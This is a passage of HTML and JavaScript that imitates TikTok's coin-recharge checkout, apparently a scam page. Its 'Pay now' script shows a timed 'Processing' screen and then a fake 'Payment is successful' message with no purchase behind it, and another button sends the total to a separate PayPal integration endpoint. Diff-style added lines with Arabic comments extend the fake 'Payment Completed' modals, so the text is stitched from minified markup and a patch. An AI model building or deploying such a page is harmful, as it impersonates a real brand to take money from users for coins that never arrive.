WxfX1wiOntcImlkXCI6XCJ1aWRfMTE0MTZjNjU5Y19tZGE2bWpnNm16dVwiLFwibmFtZVwiOlwic25cIn19LFwiaGlkZVwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkX2VjYzY3NTgzOTNfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcImRuXCJ9fSxcImV4cG9ydFwiOntcIl9fdHlwZV9fXCI6XCJjcm9zc19kb21haW5fZnVuY3Rpb25cIixcIl9fdmFsX19cIjp7XCJpZFwiOlwidWlkXzVmOTgzNjBlNTFfbWRhNm1qZzZtenVcIixcIm5hbWVcIjpcIkluXCJ9fX19In19__" scrolling="no" style="background-color: transparent; border: none;" title="PayPal"></iframe><div class="smart-menu" id="smart-menu"></div><div class="installments-modal" id="installments-modal"></div><iframe name="__detect_close_uid_4e7d9cc2f4_mda6mjg6mzu__" style="display: none;"></iframe></div></div></div></div></div><div class="pc-payment-list pc-payment-list-bottom"></div></div><div class="pc-payment-pay"><div class="pc-payment-pay-container"><div class="pc-payment-pay-container-btn"></div></div></div></form></div></div></div></div><footer class="tiktok-1quj9yy-FooterContainer epvo4190"><div class="tiktok-84khz2-DivCashierFooterTextContainer epvo4197"><div class="tiktok-1lkcylx-DivCashierFooterText epvo4191" data-e2e="cashier-pipo-treaty-text"><span class="tiktok-2mck4x-TextContainer eblccp10">By clicking "Pay now", you agree to our <a class="tiktok-1w73l1x-ACashierFooterLink epvo4192">Terms of Purchase for Coins</a>. By using any amount of Coins within <span>14</span> days after clicking "Pay Now," you acknowledge and confirm that you will no longer be eligible for a refund of this order.<div class="tiktok-l41yxy-DivRegionChangeText epvo4198">To assess your tax rate in accordance with our <span class="tiktok-1vl1wgs-SpanBoldText e147t33g0">Privacy Policy</span>, TikTok detected that your location is <span class="tiktok-1vl1wgs-SpanBoldText e147t33g0"><button class="tiktok-1m6nl1r-Button e18zrus10" color="TextPrimary" data-popover-path="US"><div class="tiktok-1fbpw1u-ButtonLabel e18zrus12">New York, New York, New York, United States</div><svg fill="currentColor" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M21.88 33.12l-14.3-14.3a1 1 0 010-1.4l2.83-2.83a1 1 0 011.42 0L24 26.76l12.17-12.17a1 1 0 011.42 0l2.82 2.82a1 1 0 010 1.42l-14.29 14.3a3 3 0 01-4.24 0z" fill-rule="evenodd"></path></svg></button></span>.</div></span></div></div><div class="tiktok-k6ibtx-DivButtonsContainer epvo4193"><button class="epvo4195 tiktok-1nf9zwy-Button-StyledCashierHelpButton ehk74z00" data-e2e="cashier-faq-icon" type="button"><svg data-e2e="" fill="currentColor" height="1em" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z" fill-rule="evenodd"></path></svg></button><div><button class="epvo4194 tiktok-aeo2ro-Button-StyledPayButton ehk74z00" id="payNowBtn" type="button">Pay now</button></div></div></footer></div><div aria-label="Close" class="tiktok-xutjcp-DivCloseWrapper e1gjoq3k6" data-e2e="modal-close-inner-button" role="button" style="margin-top:5px;z-index:100" tabindex="0"><svg class="tiktok-1anes8e-StyledIcon e1gjoq3k5" data-e2e="" fill="currentColor" height="1em" onclick="back()" viewBox="0 0 48 48" width="1em" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M21.1718 23.9999L10.2931 13.1212C9.90261 12.7307 9.90261 12.0975 10.2931 11.707L11.7074 10.2928C12.0979 9.90228 12.731 9.90228 13.1216 10.2928L24.0002 21.1715L34.8789 10.2928C35.2694 9.90228 35.9026 9.90228 36.2931 10.2928L37.7073 11.707C38.0979 12.0975 38.0979 12.7307 37.7073 13.1212L26.8287 23.9999L37.7073 34.8786C38.0979 35.2691 38.0979 35.9023 37.7073 36.2928L36.2931 37.707C35.9026 38.0975 35.2694 38.0975 34.8789 37.707L24.0002 26.8283L13.1216 37.707C12.731 38.0975 12.0979 38.0975 11.7074 37.707L10.2931 36.2928C9.90261 35.9023 9.90261 35.2691 10.2931 34.8786L21.1718 23.9999Z" fill-rule="evenodd"></path></svg></div></div></div></div><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="0"></div></div><div class="tiktok-py8jux-DivModalContainer e1gjoq3k0" id="main3" style="z-index:1001;position:fixed;Display:none"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="0"></div><div data-focus-lock-disabled="false"><div class="tiktok-1dw2wty-DivCenterWrapper e1gjoq3k7"><div class="tiktok-it2bln-DivContentContainer e1gjoq3k3" data-e2e="" id="login-modal" tabindex="0"><div class="tiktok-mzpspd-DivCashierPage egzga6o0"><div class="tiktok-1ut32db-DivCashierContainer egzga6o1"><img src="https://assets-v2.lottiefiles.com/a/b9a425be-1162-11ee-bc1c-eb55ba886687/O0N2VLCU3i.gif" style="margin:30px;text-align:center;align-items:center;display:flex;top:50%;left:45%;transform:translate(-50%,0);position:relative" width="170" height="auto"><div style="font-weight:700;font-size:30px;text-align:center">Processing...</div><form><div class="pc-payment-container"><div class="pc-payment-header"><div class="arco-row arco-row-align-center arco-row-justify-center"><div class="arco-statistic"><div class="arco-statistic-content"><div class="arco-statistic-value" style="color:var(--pipo-pc-color-text-primary);font-size:var(--pipo-pc-font-size-display-primary);font-weight:var(--pipo-pc-font-weight-title)"></div></div></div></div><div class="pc-payment-header-divider"></div></div><div class="pc-payment-list"><div class="pc-payment-list-title"></div></div><div class="pc-payment-list pc-payment-list-bottom"></div></div><div class="pc-payment-pay"><div class="pc-payment-pay-container"><div class="pc-payment-pay-container-btn"></div></div></div></form></div></div></div></div></div></div><div class="tiktok-py8jux-DivModalContainer e1gjoq3k0" id="main4" style="z-index:1001;position:fixed;Display:none"><div class="tiktok-v2a75e-DivModalMask e1gjoq3k2"></div><div data-focus-guard="true" style="width:1px;height:0;padding:0;overflow:hidden;position:fixed;top:1px;left:1px" tabindex="0"></div><div data-focus-lock-disabled="false"><div class="tiktok-1dw2wty-DivCenterWrapper e1gjoq3k7"><div class="tiktok-it2bln-DivContentContainer e1gjoq3k3" data-e2e="" id="login-modal" tabindex="0"><div class="tiktok-mzpspd-DivCashierPage egzga6o0"><div class="tiktok-1ut32db-DivCashierContainer egzga6o1"><img src="https://i.ibb.co/MVDgKhg/pngwing-com.png" style="margin:10px;top:50%;left:50%;transform:translate(-50%,0);position:relative" width="170" height="auto"><div class="step1-text" style="font-weight:700;text-align:center;font-size:30px">Payment is successful</div><div class="text-lastStep" style="margin-top:10px;text-align:center;font-size:22px"><span id="user-name2" style="color:#000;font-weight:700;text-align:center;font-size:22px">EDGFF</span> recharged <span id="lastStep-coin2" style="color:#000;font-weight:700;text-align:center;font-size:22px">555,555 Coins</span> coins.</div><div class="text-lastStep" style="margin-top:10px;text-align:center;font-size:22px">Recharged will be completed within 24 hour.</div><button class="epvo4194 tiktok-aeo2ro-Button-StyledPayButton ehk74z00" onclick="done()" style="margin:20px;top:50%;left:48.5%;transform:translate(-50%,0);position:relative" type="button">Done</button><form><div class="pc-payment-container"><div class="pc-payment-header"><div class="arco-row arco-row-align-center arco-row-justify-center"><div class="arco-statistic"><div class="arco-statistic-content"><div class="arco-statistic-value" style="color:var(--pipo-pc-color-text-primary);font-size:var(--pipo-pc-font-size-display-primary);font-weight:var(--pipo-pc-font-weight-title)"></div></div></div></div><div class="pc-payment-header-divider"></div></div><div class="pc-payment-list"><div class="pc-payment-list-title"></div></div><div class="pc-payment-list pc-payment-list-bottom"></div></div><div class="pc-payment-pay"><div class="pc-payment-pay-container"><div class="pc-payment-pay-container-btn"></div></div></div></form></div></div></div></div></div></div><script>var juy=window.location.origin;{var platformname="platform1";function Selectedplatform(t){document.getElementById("platform1").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform2").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform3").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform4").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform5").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform6").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform7").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform8").classList.add("tiktok-l4v9n8-ButtonContainer"),document.getElementById("platform1").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform2").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform3").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform4").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform5").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform6").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform7").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById("platform8").classList.remove("tiktok-1xsxoj2-ButtonContainer"),document.getElementById(t).classList.add("tiktok-1xsxoj2-ButtonContainer"),document.getElementById(t).classList.remove("tiktok-l4v9n8-ButtonContainer"),"platform1"==t?(document.getElementById("total").innerHTML="$ 2",document.getElementById("total2").innerHTML="$ 2",document.getElementById("total3").innerHTML="$ 2",document.getElementById("lastStep-coin").innerHTML="10,000 Coins",document.getElementById("lastStep-coin2").innerHTML="10,000 Coins",localStorage.setItem("total",2)):"platform2"==t?(document.getElementById("total").innerHTML="$ 4",document.getElementById("total2").innerHTML="$ 4",document.getElementById("total3").innerHTML="$ 4",document.getElementById("lastStep-coin").innerHTML="20,000 Coins",document.getElementById("lastStep-coin2").innerHTML="20,000 Coins",localStorage.setItem("total",4)):"platform3"==t?(document.getElementById("total").innerHTML="$ 8",document.getElementById("total2").innerHTML="$ 8",document.getElementById("total3").innerHTML="$ 8",document.getElementById("lastStep-coin").innerHTML="40,000 Coins",document.getElementById("lastStep-coin2").innerHTML="40,000 Coins",localStorage.setItem("total",8)):"platform4"==t?(document.getElementById("total").innerHTML="$ 12",document.getElementById("total2").innerHTML="$ 12",document.getElementById("total3").innerHTML="$ 12",document.getElementById("lastStep-coin").innerHTML="60,000 Coins",document.getElementById("lastStep-coin2").innerHTML="60,000 Coins",localStorage.setItem("total",12)):"platform5"==t?(document.getElementById("total").innerHTML="$ 16",document.getElementById("total2").innerHTML="$ 16",document.getElementById("total3").innerHTML="$ 16",document.getElementById("lastStep-coin").innerHTML="80,000 Coins",document.getElementById("lastStep-coin2").innerHTML="80,000 Coins",localStorage.setItem("total",16)):"platform6"==t?(document.getElementById("total").innerHTML="$ 20",document.getElementById("total2").innerHTML="$ 20",document.getElementById("total3").innerHTML="$ 20",document.getElementById("lastStep-coin").innerHTML="100,000 Coins",document.getElementById("lastStep-coin2").innerHTML="100,000 Coins",localStorage.setItem("total",20)):"platform7"==t?(document.getElementById("total").innerHTML="$ 40",document.getElementById("total2").innerHTML="$ 40",document.getElementById("total3").innerHTML="$ 40",document.getElementById("lastStep-coin").innerHTML="200,000 Coins",document.getElementById("lastStep-coin2").innerHTML="200,000 Coins",localStorage.setItem("total",40)):"platform8"==t&&(number=document.getElementById("uid1").value,total=2e-4*number.replace(/,/g,""),document.getElementById("total").innerHTML="$ "+total.toFixed(2),document.getElementById("total2").innerHTML="$ "+total.toFixed(2),document.getElementById("total3").innerHTML="$ "+total.toFixed(2),document.getElementById("lastStep-coin").innerHTML=document.getElementById("uid1").value+" Coins",document.getElementById("lastStep-coin2").innerHTML=document.getElementById("uid1").value+" Coins",""==document.getElementById("uid1").value?(document.getElementById("recharge").style.color="rgb(255, 255, 255)",document.getElementById("recharge").style.backgroundColor="rgb(254, 44, 85)",document.getElementById("platform9").style.borderColor="rgb(250, 206, 21)",document.getElementById("minnumb").style.color="rgba(22, 24, 35, 0.5)",document.getElementById("minnumb").innerHTML="30-2,500,000"):document.getElementById("uid1").value<30?(document.getElementById("recharge").style.color="rgba(166,167,171,255)",document.getElementById("recharge").style.backgroundColor="rgba(241,241,242,255)",document.getElementById("platform9").style.borderColor="red",document.getElementById("minnumb").style.color="red",document.getElementById("minnumb").innerHTML="Minimum: 30"):(document.getElementById("recharge").style.color="rgb(255, 255, 255)",document.getElementById("recharge").style.backgroundColor="rgb(254, 44, 85)",document.getElementById("platform9").style.borderColor="rgb(250, 206, 21)",document.getElementById("minnumb").style.color="rgba(22, 24, 35, 0.5)",document.getElementById("minnumb").innerHTML="30-2,500,000"))}function recharge(){document.getElementById("user-name").innerHTML=document.getElementById("uid").value,document.getElementById("user-name2").innerHTML=document.getElementById("uid").value,""==document.getElementById("uid").value?document.getElementById("uid").style.boxShadow="0 0 5px red":(document.getElementById("uid").style.boxShadow="0 0 0px red",document.getElementById("main2").style.display="flex")}function back(){document.getElementById("main2").style.display="none"}function paynow(){document.getElementById("main2").style.display="none",document.getElementById("main3").style.display="flex",setTimeout((function(){document.getElementById("main3").style.display="none",document.getElementById("main4").style.display="flex"}),7e3)}function done(){document.getElementById("main4").style.display="none"}function btn1(){document.getElementById("btn1").style.display="none",document.getElementById("btn2").style.display="block"}function btn2(){document.getElementById("btn2").style.display="none",document.getElementById("btn1").style.display="block"}}</script><script>function formatNumberWithCommas(){var e=document.getElementById("uid1"),t=e.value.replace(/\D/g,"").replace(/\B(?=(\d{3})+(?!\d))/g,",");e.value=t}$("#uid1").on("input",(function(e){number=document.getElementById("uid1").value,total=2e-4*number.replace(/,/g,""),localStorage.setItem("total",total)}))</script><script>$("#uid1").on("input",(function(e){e.preventDefault(),number=document.getElementById("uid1").value,total=2e-4*number.replace(/,/g,""),document.getElementById("total").innerHTML="$ "+total.toFixed(2),document.getElementById("total2").innerHTML="$ "+total.toFixed(2),document.getElementById("total3").innerHTML="$ "+total.toFixed(2),document.getElementById("lastStep-coin").innerHTML=document.getElementById("uid1").value+" Coins",document.getElementById("lastStep-coin2").innerHTML=document.getElementById("uid1").value+" Coins",""==document.getElementById("uid1").value?(document.getElementById("recharge").style.color="rgb(255, 255, 255)",document.getElementById("recharge").style.backgroundColor="rgb(254, 44, 85)",document.getElementById("platform9").style.borderColor="rgb(250, 206, 21)",document.getElementById("minnumb").style.color="rgba(22, 24, 35, 0.5)",document.getElementById("minnumb").innerHTML="30-2,500,000"):document.getElementById("uid1").value<30?(document.getElementById("recharge").style.color="rgba(166,167,171,255)",document.getElementById("recharge").style.backgroundColor="rgba(241,241,242,255)",document.getElementById("platform9").style.borderColor="red",document.getElementById("minnumb").style.color="red",document.getElementById("minnumb").innerHTML="Minimum: 30"):(document.getElementById("recharge").style.color="rgb(255, 255, 255)",document.getElementById("recharge").style.backgroundColor="rgb(254, 44, 85)",document.getElementById("platform9").style.borderColor="rgb(250, 206, 21)",document.getElementById("minnumb").style.color="rgba(22, 24, 35, 0.5)",document.getElementById("minnumb").innerHTML="30-2,500,000")}))</script><script>$(document).ready((function(){$("#payNow").click((function(){var t=$("#total3").text();window.open("http://localhost/paypal_integration/public/pay?total="+t.replace("$",""))}))}))</script>
+<!-- نافذة منبثقة Order Summary -->
+
+<script>
+  function openOrderSummary() {
+    document.getElementById('orderSummaryModal').style.display = 'flex';
+  }
+  function closeOrderSummary() {
+    document.getElementById('orderSummaryModal').style.display = 'none';
+  }
+
+  // ربط زر recharge
+  const rechargeBtn = document.getElementById('recharge');
+  if (rechargeBtn) {
+    rechargeBtn.addEventListener('click', function(e){
+      e.preventDefault();
+      openOrderSummary();
+    });
+  }
+</script>
+<!-- نافذة Processing -->
+<div class="modal fade" id="processingModal" tabindex="-1" style="display: none;" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content text-center p-5">
+<div class="modal-body">
+<div class="d-flex justify-content-center mb-3">
+<span class="spinner-grow text-danger me-2"></span>
+<span class="spinner-grow text-success"></span>
+</div>
+<h5>Processing your Payment</h5>
+<p>This could take a few seconds</p>
+</div>
+</div>
+</div>
+</div>
+<script>
+  
+document.addEventListener("DOMContentLoaded", function() {
+  var payNowBtn = document.getElementById("payNowBtn");
+  if (payNowBtn) {
+    payNowBtn.addEventListener("click", function() {
+      // جلب قيمة coins من input
+      var coinsValue = document.getElementById("customCoinsInput") ? document.getElementById("customCoinsInput").value : "0";
+      var formattedCoins = Number(coinsValue).toLocaleString();
+
+      // تحديث Order Summary
+      var orderSummarySpan = document.getElementById("orderSummaryAmount");
+      if (orderSummarySpan) orderSummarySpan.innerText = formattedCoins;
+
+      // تحديث Payment Completed
+      var coinsAmountSpan = document.getElementById("coinsAmount");
+      if (coinsAmountSpan) coinsAmountSpan.innerText = formattedCoins;
+
+      // إغلاق نافذة Order Summary
+      var orderModal = bootstrap.Modal.getInstance(document.getElementById('orderSummaryModal'));
+      if (orderModal) orderModal.hide();
+
+      // فتح نافذة Processing
+      var processingModal = new bootstrap.Modal(document.getElementById('processingModal'));
+      processingModal.show();
+
+      // بعد 3 ثواني: إغلاق Processing وفتح Payment Completed
+      setTimeout(() => {
+        processingModal.hide();
+        var completedModal = new bootstrap.Modal(document.getElementById('completedModal'));
+        completedModal.show();
+      }, 5000);
+    });
+  }
+});
+
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<!-- نافذة Payment Completed -->
+<div class="modal fade" id="completedModal" tabindex="-1" style="display: none;" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content text-center p-5">
+<div class="modal-body">
+<!-- علامة صح -->
+<div class="d-flex justify-content-center mb-3">
+<div class="d-flex justify-content-center mb-3">
+<div class="d-flex justify-content-center mb-3">
+<svg class="success-check" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
+<circle class="success-check__circle" cx="26" cy="26" fill="none" r="25"></circle>
+<path class="success-check__check" d="M14 27l7 7 16-16" fill="none"></path>
+</svg>
+</div>
+<style>
+.success-check {
+  width: 100px;
+  height: 100px;
+  stroke-width: 3;
+  stroke: #4CAF50; /* أخضر */
+  stroke-miterlimit: 10;
+  fill: none;
+}
+.success-check__circle {
+  stroke-dasharray: 166;
+  stroke-dashoffset: 166;
+  animation: draw-circle 1s ease forwards;
+}
+.success-check__check {
+  stroke-dasharray: 48;
+  stroke-dashoffset: 48;
+  animation: draw-check 0.5s ease forwards 1s;
+}
+@keyframes draw-circle {
+  to { stroke-dashoffset: 0; }
+}
+@keyframes draw-check {
+  to { stroke-dashoffset: 0; }
+}
+</style>
+</div>
+<style>
+.checkmark {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  display: block;
+  stroke-width: 2;
+  stroke: #4CAF50;
+  stroke-miterlimit: 10;
+  margin: 0 auto;
+  box-shadow: inset 0px 0px 0px #4CAF50;
+  animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+}
+.checkmark__circle {
+  stroke-dasharray: 166;
+  stroke-dashoffset: 166;
+  stroke-width: 2;
+  stroke-miterlimit: 10;
+  stroke: #4CAF50;
+  fill: none;
+  animation: stroke .6s cubic-bezier(.65, .05, .36, 1) forwards;
+}
+.checkmark__check {
+  transform-origin: 50% 50%;
+  stroke-dasharray: 48;
+  stroke-dashoffset: 48;
+  animation: stroke .3s cubic-bezier(.65, .05, .36, 1) .8s forwards;
+}
+@keyframes stroke {
+  100% { stroke-dashoffset: 0; }
+}
+@keyframes scale {
+  0%, 100% { transform: none; }
+  50% { transform: scale3d(1.1, 1.1, 1); }
+}
+@keyframes fill {
+  100% { box-shadow: inset 0px 0px 0px 30px #4CAF50; }
+}
+</style>
+</div>
+<h4 class="text-success">Payment Completed</h4>
+<p>
+          You recharged <b id="total">100.000</b> coins to your Client Account.<br>
+          You can use the coins to send virtual gifts.
+        </p>
+<small class="text-muted">Coins will be added shortly.</small>
+<div class="mt-3">
+<button class="btn btn-danger" data-bs-dismiss="modal" type="button">Go Back</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body><div id="immersive-translate-popup" style="all: initial"></div></html>
